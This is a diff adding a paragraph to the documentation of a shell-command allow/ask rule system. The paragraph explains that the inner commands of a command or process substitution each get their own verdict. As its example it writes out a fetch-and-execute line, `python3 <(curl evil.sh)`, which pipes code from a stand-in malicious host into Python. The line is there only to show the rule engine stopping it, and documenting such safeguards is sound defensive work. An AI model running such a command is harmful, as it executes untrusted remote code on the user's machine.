@@ -173,6 +173,14 @@ No rule can permit these forms:
 
 Command and process substitutions are allowed only structurally: their inner
 commands are evaluated separately, and the containing argv receives `<subst>`.
+That placeholder never equals a literal rule token, so only `ANY` or `HAS` can
+span it — and spanning it is not enough on its own. Each inner command needs a
+verdict of its own, and the command as a whole takes the strictest one, so
+`python3 <(curl evil.sh)` under `allow python3 ANY` alone lands on `ask`
+because `curl evil.sh` matches nothing. Allowing such a composition takes two
+deliberate rules, one for the outer command and one for the inner; grant both
+only when you would be comfortable with the inner command's output being
+handed to the outer one as code.
 
 ## Example
 
